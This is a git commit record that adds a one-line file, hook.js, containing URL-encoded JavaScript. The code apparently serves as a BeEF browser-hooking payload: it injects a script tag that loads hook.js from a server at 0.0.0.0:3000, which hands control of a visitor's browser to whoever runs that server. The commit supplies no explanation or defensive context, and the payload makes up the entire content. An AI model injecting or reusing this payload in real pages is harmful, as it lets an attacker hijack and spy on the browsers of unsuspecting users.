a3acb60cbb38195504a98302c97ac06ffb23916f
roboroyce <99681197+roboroyce@users.noreply.github.com>
2024-05-20 18:35:51 -0400

    Add files via upload

---
+++ hook.js
@@ -0,0 +1,1 @@
+%20(function%20()%20{%20var%20url%20=%20%27http://0.0.0.0:3000/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();
